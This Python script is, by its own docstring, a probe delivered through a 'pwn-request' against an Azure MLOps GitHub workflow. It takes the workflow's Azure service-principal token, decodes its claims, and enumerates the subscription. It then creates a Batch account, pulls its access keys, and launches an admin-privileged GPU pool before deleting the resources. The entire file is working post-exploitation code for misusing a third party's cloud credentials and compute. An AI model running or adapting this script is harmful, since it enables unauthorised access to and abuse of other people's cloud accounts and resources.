#!/usr/bin/env python3
"""C211 i121110 probe (mslearn-mlops Azure pwn-request vehicle, subscription 790067ff):
Azure Batch BatchService pool GPU measurement.

Under the workflow's azure/login ARM token (SP Contributor on RG chriso-sandbox-rg only):
  1. registration matrix: subscription providers list (Microsoft.Batch / Microsoft.Storage)
     + RG-scope batchAccounts/storageAccounts list (valid registration probes even if the
     subscription-scope read is 403)
  2. create ONE nonce Batch account c211i121110batch (poolAllocationMode BatchService, no
     storage account) and poll provisioningState; read dedicatedCoreQuota /
     dedicatedCoreQuotaPerVMFamily / poolQuota verbatim
  3. create ONE nonce pool targetDedicatedNodes 1 with vmSize Standard_NC4as_T4_v3
     (fallbacks Standard_NC6s_v3, Standard_NC8as_T4_v3), DSVM Ubuntu HPC image and the
     Microsoft.HpcCompute NvidiaGpuDriverLinux extension; start task runs nvidia-smi -L and
     --query-gpu=name,uuid,memory.total; every verbatim create/resize error recorded
  4. poll the pool + data-plane nodes; when a node exists read the start-task stdout/stderr
     (account key via listKeys -> Ocp-Apim-Subscription-Key) for the device name+UUID, plus an
     independent ARM readback of currentDedicatedNodes/vmSize
  5. delete pool + Batch account and prove absence (GET 404 + RG list NO_RESULTS)
Emits progress lines 'C211_i121110_PROGRESS <json>' and one final
'C211_i121110_RESULT <base64(json)>' line. No secret values are printed.
"""
import argparse
import base64
import json
import os
import random
import string
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

INTENT = 'i121110'
ARM = 'https://management.azure.com'
RG = 'chriso-sandbox-rg'
ACCT = 'c211i121110batch'
POOL = 'c211-i121110-pool'
VM_CANDIDATES = ['Standard_NC4as_T4_v3', 'Standard_NC6s_v3', 'Standard_NC8as_T4_v3']
IMAGES = [
    {'publisher': 'microsoft-dsvm', 'offer': 'ubuntu-hpc', 'sku': '2204', 'version': 'latest',
     'nodeAgentSKUId': 'batch.node.ubuntu 22.04', 'label': 'dsvm-ubuntu-hpc-2204'},
    {'publisher': 'microsoft-dsvm', 'offer': 'ubuntu-hpc', 'sku': '2004', 'version': 'latest',
     'nodeAgentSKUId': 'batch.node.ubuntu 20.04', 'label': 'dsvm-ubuntu-hpc-2004'},
]
LOC_PREF = ['westeurope', 'eastus2', 'westus2', 'northeurope', 'southeastasia', 'canadacentral', 'eastus']
BATCH_API = ['2022-01-01', '2021-06-01']
DP_VERSIONS = ['2022-01-01.15.0', '2021-06-01.14.0', '2020-09-01.12.0', '2019-08-01.10.0']
START_CMD = ('echo C211_i121110_START; uname -a; nvidia-smi -L; '
             'nvidia-smi --query-gpu=name,uuid,memory.total --format=csv; '
             'ls -l /dev/nvidia* 2>&1; lspci 2>&1 | grep -i nvidia; echo C211_i121110_DONE')


def p(*a):
    print(*a, flush=True)


def prog(step, **kw):
    try:
        p('C211_%s_PROGRESS ' % INTENT + json.dumps({'step': step, 't': time.strftime('%FT%TZ', time.gmtime()), **kw})[:3500])
    except Exception as e:
        p('C211_%s_PROGRESS_ERR ' % INTENT + repr(e))


def emit(R):
    blob = json.dumps(R, default=str)
    b64 = base64.b64encode(blob.encode()).decode()
    p('C211_%s_RESULT ' % INTENT + b64)


def sh(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {'cmd': cmd, 'rc': r.returncode, 'out': r.stdout[-4000:], 'err': r.stderr[-1500:]}
    except Exception as e:
        return {'cmd': cmd, 'rc': -1, 'err': repr(e)}


def jget(tok, url):
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-' + INTENT})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return r.status, json.loads(r.read() or b'{}')
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read() or b'{}')
        except Exception:
            return e.code, {'error': 'http'}
    except Exception as e:
        return -1, {'error': repr(e)}


def jcall(tok, method, url, body=None, timeout=240):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={
        'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-' + INTENT, 'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try:
                return r.status, json.loads(raw or b'{}'), dict(r.headers)
            except Exception:
                return r.status, {'raw': raw[:800].decode('utf8', 'replace')}, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            b = json.loads(e.read() or b'{}')
        except Exception:
            b = {'error': 'http'}
        return e.code, b, dict(e.headers)
    except Exception as e:
        return -1, {'error': repr(e)}, {}


def err_of(resp):
    """Compact verbatim provider error extraction."""
    if not isinstance(resp, dict):
        return resp
    e = resp.get('error') if isinstance(resp.get('error'), dict) else resp
    out = {}
    for k in ('code', 'message', 'target'):
        if isinstance(e, dict) and e.get(k):
            out[k] = e[k]
    if not out:
        out = {k: resp.get(k) for k in ('code', 'message') if resp.get(k)}
    txt = json.dumps(resp, default=str)
    out['body_head'] = txt[:900]
    return out


def providers_matrix(tok, sub, R):
    M = {}
    st, resp = jget(tok, f'{ARM}/subscriptions/{sub}/providers?api-version=2021-04-01')
    M['sub_providers_list'] = {'status': st}
    if st == 200:
        want = {'Microsoft.Batch': None, 'Microsoft.Storage': None}
        for pr in (resp.get('value') or []):
            if pr.get('namespace') in want:
                want[pr['namespace']] = pr.get('registrationState')
        M['sub_providers_list']['states'] = want
        M['sub_providers_list']['total'] = len(resp.get('value') or [])
    else:
        M['sub_providers_list']['error'] = err_of(resp)
    # RG-scope registration probes (Contributor-valid, unaffected by subscription-scope 403)
    st2, r2 = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts?api-version={BATCH_API[0]}')
    M['rg_batchaccounts_list'] = {'status': st2, 'count': len(r2.get('value') or []) if st2 == 200 else None,
                                  'names': [x.get('name') for x in (r2.get('value') or [])] if st2 == 200 else None}
    if st2 != 200:
        M['rg_batchaccounts_list']['error'] = err_of(r2)
    st3, r3 = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01')
    M['rg_storageaccounts_list'] = {'status': st3, 'count': len(r3.get('value') or []) if st3 == 200 else None}
    if st3 != 200:
        M['rg_storageaccounts_list']['error'] = err_of(r3)
    R['providers'] = M
    prog('providers', sub_list=M['sub_providers_list'], rg_batch=M['rg_batchaccounts_list'].get('status'),
         rg_storage=M['rg_storageaccounts_list'].get('status'))
    return M


def sku_matrix(tok, sub, R):
    st, cat = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/skus?api-version=2021-07-01')
    out = {'status': st, 'skus': {}}
    if st == 200:
        for s in (cat.get('value') or []):
            if s.get('name') in VM_CANDIDATES:
                caps = {c.get('name'): c.get('value') for c in (s.get('capabilities') or [])}
                out['skus'].setdefault(s['name'], []).append({
                    'locations': [l.lower().replace(' ', '') for l in (s.get('locations') or [])],
                    'family': s.get('family'), 'vcpus': caps.get('vCPUs'), 'gpus': caps.get('GPUs')})
    else:
        out['error'] = err_of(cat)
    R['sku_catalog'] = out
    locs = []
    for name in VM_CANDIDATES:
        for e in out['skus'].get(name, []):
            for l in e['locations']:
                if l not in locs:
                    locs.append(l)
    R['t4_regions'] = [l for e in out['skus'].get('Standard_NC4as_T4_v3', []) for l in e['locations']]
    prog('sku', counts={k: len(v) for k, v in out['skus'].items()},
         t4_regions=sorted(set(R['t4_regions']))[:20])
    return R['t4_regions']


def batch_api_call(tok, method, path, body=None):
    """Try the Batch ARM api-versions in order; return (apiver, status, resp)."""
    last = (None, -1, {})
    for av in BATCH_API:
        url = ARM + path + ('&' if '?' in path else '?') + 'api-version=' + av
        st, resp, _ = jcall(tok, method, url, body)
        last = (av, st, resp)
        if st in (200, 201, 202):
            return last
        txt = json.dumps(resp, default=str)
        if 'api-version' not in txt.lower():
            return last
    return last


def account_get(tok, sub):
    return batch_api_call(tok, 'GET', f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts/{ACCT}')


def account_create(tok, sub, loc, R):
    body = {'location': loc, 'properties': {'poolAllocationMode': 'BatchService'}}
    out = {'location': loc, 'attempts': []}
    for av in BATCH_API:
        url = f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts/{ACCT}?api-version={av}'
        st, resp, hdr = jcall(tok, 'PUT', url, body)
        out['attempts'].append({'api_version': av, 'status': st, 'resp': resp if st not in (200, 201) else
                                {'id': resp.get('id'), 'location': resp.get('location'), 'properties': resp.get('properties')}})
        if st in (200, 201):
            out['create_status'] = st
            break
    R['account'] = out
    prog('account_create', attempts=[{'av': a['api_version'], 'status': a['status'],
                                      'err': err_of(a['resp']) if a['status'] not in (200, 201) else None}
                                     for a in out['attempts']])
    return out.get('create_status')


def account_poll(tok, sub, R, deadline_s=480):
    t0 = time.time()
    polls = []
    last = None
    while time.time() - t0 < deadline_s:
        av, st, resp = account_get(tok, sub)
        props = (resp.get('properties') or {}) if st == 200 else {}
        last = {'status': st, 'provisioningState': props.get('provisioningState'),
                'accountEndpoint': props.get('accountEndpoint'),
                'dedicatedCoreQuota': props.get('dedicatedCoreQuota'),
                'dedicatedCoreQuotaPerVMFamilyEnforced': props.get('dedicatedCoreQuotaPerVMFamilyEnforced'),
                'poolQuota': props.get('poolQuota'),
                'activeJobAndScheduleQuota': props.get('activeJobAndScheduleQuota'),
                'family_quotas': {f.get('name'): f.get('coreQuota') for f in (props.get('dedicatedCoreQuotaPerVMFamily') or [])},
                'poolAllocationMode': props.get('poolAllocationMode')}
        polls.append(last)
        prog('account_poll', n=len(polls), status=st, state=last['provisioningState'],
             dedicatedCoreQuota=last['dedicatedCoreQuota'], poolQuota=last['poolQuota'],
             fam_gpu={k: v for k, v in last['family_quotas'].items()
                      if any(x in k.lower() for x in ('nc', 'nv', 'nd', 'gpu', 't4', 'v100'))})
        if st == 200 and last['provisioningState'] in ('Succeeded', 'Failed', 'Cancelled'):
            break
        time.sleep(15)
    R['account_poll'] = {k: last.get(k) for k in last} if last else None
    R['account_poll_count'] = len(polls)
    return last


_DP_HDR_CACHE = {}


def dp_headers_list(tok, key):
    """Return header candidates for Batch data plane auth (cached)."""
    ck = 'hdr-' + (key or '')[:8]
    if ck in _DP_HDR_CACHE:
        return _DP_HDR_CACHE[ck]
    hs = [{'Ocp-Apim-Subscription-Key': key}]
    tr = sh('az account get-access-token --resource https://batch.core.windows.net/ -o json 2>&1', timeout=90)
    try:
        bt = json.loads(tr['out']).get('accessToken')
        if bt:
            hs.append({'Authorization': 'Bearer ' + bt})
    except Exception:
        pass
    _DP_HDR_CACHE[ck] = hs
    return hs


def dp_call(tok, endpoint, key, method, path, body=None, raw=False):
    """Batch data plane call with api-version + auth fallbacks. Returns dict with status/body/av/auth."""
    last = {'status': -1, 'body': {}, 'av': None, 'auth': None}
    for auth, hdr in enumerate(dp_headers_list(tok, key)):
        for av in DP_VERSIONS:
            url = f'https://{endpoint}{path}' + ('&' if '?' in path else '?') + 'api-version=' + av
            data = json.dumps(body).encode() if body is not None else None
            headers = dict(hdr)
            headers['User-Agent'] = 'c211-' + INTENT
            if body is not None:
                headers['Content-Type'] = 'application/json'
            req = urllib.request.Request(url, data=data, method=method, headers=headers)
            try:
                with urllib.request.urlopen(req, timeout=90) as r:
                    rb = r.read()
                    try:
                        bodyj = json.loads(rb or b'{}')
                    except Exception:
                        bodyj = {'raw': rb[:200].decode('utf8', 'replace')} if not raw else {'raw_len': len(rb)}
                    return {'status': r.status, 'body': bodyj, 'av': av, 'auth': auth,
                            'raw': rb.decode('utf8', 'replace') if raw else None}
            except urllib.error.HTTPError as e:
                try:
                    bodyj = json.loads(e.read() or b'{}')
                except Exception:
                    bodyj = {'error': 'http'}
                last = {'status': e.code, 'body': bodyj, 'av': av, 'auth': auth}
                txt = json.dumps(bodyj, default=str).lower()
                if e.code in (401, 403):
                    break  # next auth method
                if 'api-version' in txt or e.code == 400:
                    continue  # next api version
                return last
            except Exception as e:
                last = {'status': -1, 'body': {'error': repr(e)}, 'av': av, 'auth': auth}
                continue
    return last


def pool_create(tok, sub, R):
    out = {'attempts': []}
    for vm in VM_CANDIDATES:
        for img in IMAGES:
            body = {
                'properties': {
                    'vmSize': vm,
                    'deploymentConfiguration': {'virtualMachineConfiguration': {
                        'imageReference': {k: img[k] for k in ('publisher', 'offer', 'sku', 'version')},
                        'nodeAgentSKUId': img['nodeAgentSKUId'],
                        'extensions': [{'name': 'NvidiaGpuDriverLinux', 'publisher': 'Microsoft.HpcCompute',
                                        'type': 'NvidiaGpuDriverLinux', 'typeHandlerVersion': '1.9',
                                        'autoUpgradeMinorVersion': True}]}},
                    'scaleSettings': {'fixedScale': {'targetDedicatedNodes': 1, 'targetLowPriorityNodes': 0}},
                    'startTask': {'commandLine': START_CMD, 'waitForSuccess': False,
                                  'userIdentity': {'autoUser': {'scope': 'pool', 'elevationLevel': 'admin'}}},
                    'resizeTimeout': 'PT15M',
                }
            }
            av, st, resp = batch_api_call(tok, 'PUT',
                                          f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts/{ACCT}/pools/{POOL}', body)
            att = {'vmSize': vm, 'image': img['label'], 'api_version': av, 'status': st,
                   'resp': {'id': (resp or {}).get('id'), 'properties': (resp or {}).get('properties')}
                   if st in (200, 201) else err_of(resp)}
            out['attempts'].append(att)
            prog('pool_create', vm=vm, image=img['label'], av=av, status=st,
                 err=None if st in (200, 201) else err_of(resp))
            if st in (200, 201):
                out['created'] = {'vmSize': vm, 'image': img['label'], 'status': st}
                R['pool'] = out
                return out['created']
            etxt = json.dumps(err_of(resp), default=str).lower()
            if any(w in etxt for w in ('quota', 'corequota', 'exceeded', 'insufficient')):
                break  # quota-family refusal: a different image will not change it
    R['pool'] = out
    return None


def pool_poll(tok, sub, R, endpoint, key, deadline_s=1080):
    t0 = time.time()
    polls = []
    last = {}
    files = {}
    node_id = None
    dp_fail = [0]
    while time.time() - t0 < deadline_s:
        av, st, resp = batch_api_call(tok, 'GET',
                                      f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts/{ACCT}/pools/{POOL}')
        props = (resp.get('properties') or {}) if st == 200 else {}
        last = {'status': st,
                'allocationState': props.get('allocationState'),
                'provisioningState': props.get('provisioningState'),
                'currentDedicatedNodes': props.get('currentDedicatedNodes'),
                'targetDedicatedNodes': (props.get('scaleSettings') or {}).get('fixedScale', {}).get('targetDedicatedNodes'),
                'vmSize': props.get('vmSize'),
                'resizeErrors': props.get('resizeErrors')}
        polls.append(last)
        node_state = None
        if endpoint and key:
            nl = dp_call(tok, endpoint, key, 'GET', f'/pools/{POOL}/nodes')
            if nl.get('status') in (-1, 401, 403):
                dp_fail[0] += 1
                if dp_fail[0] >= 3:
                    endpoint, key = None, None
                    R['dp_auth_failed'] = {'last_status': nl.get('status'), 'body': err_of(nl.get('body'))}
                    prog('dp_auth_failed', status=nl.get('status'), body=err_of(nl.get('body')))
                    deadline_s = min(deadline_s, (time.time() - t0) + 600)
            items = (nl.get('body') or {}).get('value') or []
            if items:
                n = items[0]
                node_id = n.get('id')
                node_state = n.get('state')
                last['node'] = {'id': node_id, 'state': node_state, 'vmSize': n.get('vmSize'),
                                'ipAddress': n.get('ipAddress'),
                                'errors': n.get('errors'),
                                'startTaskInfo': (n.get('startTaskInfo') or {})}
                if node_state in ('idle', 'running', 'starttaskfailed', 'unusable'):
                    fl = dp_call(tok, endpoint, key, 'GET',
                                 f'/pools/{POOL}/nodes/{node_id}/files?recursive=true')
                    names = [f.get('name') for f in ((fl.get('body') or {}).get('value') or [])]
                    last['files'] = names
                    for want in ('startup/stdout.txt', 'startup/stderr.txt', 'startup/fileuploadout.txt'):
                        g = dp_call(tok, endpoint, key, 'GET',
                                    f'/pools/{POOL}/nodes/{node_id}/files/{want}', raw=True)
                        if g.get('status') == 200 and g.get('raw'):
                            files[want] = g['raw'][-8000:]
                    last['node_errors'] = (n.get('errors') or [])
        prog('pool_poll', n=len(polls), alloc=last['allocationState'], prov=last['provisioningState'],
             cur=last['currentDedicatedNodes'], vmSize=last['vmSize'],
             resize_errors=last['resizeErrors'], node_state=node_state)
        if files:
            break
        if last['allocationState'] == 'steady' and last.get('currentDedicatedNodes') == 0 and last.get('resizeErrors'):
            break
        time.sleep(20)
    R['pool_poll'] = {'count': len(polls), 'last': last, 'files': files}
    return last, files


def teardown(tok, sub, R):
    T = {}
    av, st, resp = batch_api_call(tok, 'DELETE',
                                  f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts/{ACCT}/pools/{POOL}')
    T['pool_delete_status'] = st
    T['pool_delete_body'] = err_of(resp) if st not in (200, 202, 204) else None
    last = None
    for i in range(40):
        time.sleep(8)
        a2, s2, r2 = batch_api_call(tok, 'GET',
                                    f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts/{ACCT}/pools/{POOL}')
        last = s2
        if s2 == 404:
            break
    T['pool_absence_status'] = last
    av, st, resp = batch_api_call(tok, 'DELETE',
                                  f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts/{ACCT}')
    T['account_delete_status'] = st
    T['account_delete_body'] = err_of(resp) if st not in (200, 202, 204) else None
    last = None
    for i in range(50):
        time.sleep(10)
        a2, s2, r2 = account_get(tok, sub)
        last = s2
        if s2 == 404:
            break
    T['account_absence_status'] = last
    st, resp = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts?api-version={BATCH_API[0]}')
    T['rg_batchaccounts_after'] = {'status': st,
                                   'names': [x.get('name') for x in (resp.get('value') or [])] if st == 200 else err_of(resp),
                                   'no_results': st == 200 and not (resp.get('value') or [])}
    R['teardown'] = T
    prog('teardown', **{k: v for k, v in T.items() if k != 'rg_batchaccounts_after'},
         rg_after=T['rg_batchaccounts_after'])


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--subscription-id', default=None)
    ap.add_argument('--resource-group', default=None)
    ap.add_argument('--workspace', default=None)
    ap.add_argument('--endpoint-name', default=None)
    ap.add_argument('--deployment-name', default=None)
    ap.parse_known_args()
    R = {'began': time.strftime('%FT%TZ', time.gmtime()), 'intent': INTENT}
    tokr = sh('az account get-access-token --resource https://management.azure.com/ -o json 2>&1')
    tok = None
    try:
        td = json.loads(tokr['out'])
        tok = td.get('accessToken')
        R['token_expiresOn'] = td.get('expiresOn')
        R['token_claims'] = {k: v for k, v in json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '===')).items()
                             if k in ('oid', 'appid', 'tid', 'aud')}
    except Exception as e:
        R['token_parse_error'] = repr(e)
    prog('token', rc=tokr['rc'], claims=R.get('token_claims'))
    if not tok:
        R['fatal'] = 'no ARM token'
        emit(R)
        return
    st, subs = jget(tok, ARM + '/subscriptions?api-version=2022-12-01')
    R['subscriptions'] = [{'id': s.get('subscriptionId'), 'state': s.get('state'), 'name': s.get('displayName')}
                          for s in (subs.get('value') or [])] if st == 200 else {'status': st, 'resp': err_of(subs)}
    sub = (R['subscriptions'][0]['id'] if isinstance(R['subscriptions'], list) and R['subscriptions']
           else os.environ.get('AZURE_SUBSCRIPTION_ID'))
    R['sub'] = sub
    if not sub:
        R['fatal'] = 'no subscription'
        emit(R)
        return
    st, rg = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}?api-version=2021-04-01')
    R['rg'] = {'status': st, 'location': rg.get('location') if st == 200 else None,
               'name': rg.get('name') if st == 200 else None}
    if st != 200:
        R['rg']['error'] = err_of(rg)
    prog('rg', status=st, location=R['rg'].get('location'))

    providers_matrix(tok, sub, R)
    t4_regions = sku_matrix(tok, sub, R)
    ws_loc = None
    try:
        stw, wsr = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.MachineLearningServices/workspaces?api-version=2024-04-01')
        if stw == 200:
            ws = (wsr.get('value') or [])
            R['workspaces'] = [{'name': w.get('name'), 'location': w.get('location')} for w in ws]
            ws_loc = ws[0].get('location') if ws else None
    except Exception:
        pass
    loc = None
    for cand in ([ws_loc] if ws_loc else []) + LOC_PREF:
        if cand and (cand in t4_regions or 'Standard_NC4as_T4_v3' not in (R.get('sku_catalog', {}).get('skus') or {})):
            loc = cand
            break
    if not loc:
        loc = (t4_regions[0] if t4_regions else 'westeurope')
    R['batch_location'] = loc
    prog('location', chosen=loc, ws_loc=ws_loc, t4_in_loc=(loc in t4_regions))

    created = account_create(tok, sub, loc, R)
    endpoint = None
    key = None
    if created:
        acc = account_poll(tok, sub, R)
        endpoint = (acc or {}).get('accountEndpoint')
        R['account_endpoint'] = endpoint
        av, st, resp = batch_api_call(tok, 'POST',
                                      f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Batch/batchAccounts/{ACCT}/listKeys')
        R['listkeys'] = {'status': st, 'keys_present': bool((resp or {}).get('primary')) if st == 200 else False}
        key = (resp or {}).get('primary') if st == 200 else None
        prog('listkeys', status=st, endpoint=endpoint)
        if endpoint and key:
            pcreated = pool_create(tok, sub, R)
            if pcreated:
                last, files = pool_poll(tok, sub, R, endpoint, key)
            else:
                R['pool_poll'] = {'skipped': 'pool_create_refused'}
        else:
            R['pool'] = {'skipped': 'no endpoint or account key'}
    else:
        R['account_poll'] = {'skipped': 'account_create_refused'}
        R['pool'] = {'skipped': 'no batch account'}

    teardown(tok, sub, R)
    R['finished'] = time.strftime('%FT%TZ', time.gmtime())
    emit(R)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        import traceback
        p('C211_%s_FATAL ' % INTENT + repr(e))
        traceback.print_exc()
        try:
            emit({'fatal': repr(e), 'intent': INTENT})
        except Exception:
            pass
